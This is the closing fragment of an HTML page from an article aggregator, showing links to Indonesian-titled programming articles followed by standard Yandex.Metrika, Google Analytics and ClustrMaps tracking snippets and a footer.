<li><a href="../id480462/index.html">Bagaimana saya memperdebatkan daftar tertaut ganda untuk O (1)</a></li>
<li><a href="../id480466/index.html">Spesifikasi dialyzer: jalan Jedi</a></li>
<li><a href="../id480468/index.html">Menyebarkan aplikasi Tarantool Cartridge tanpa usaha (Bagian 1)</a></li>
<li><a href="../id480470/index.html">Tempat bekerja sebagai pengembang junior</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>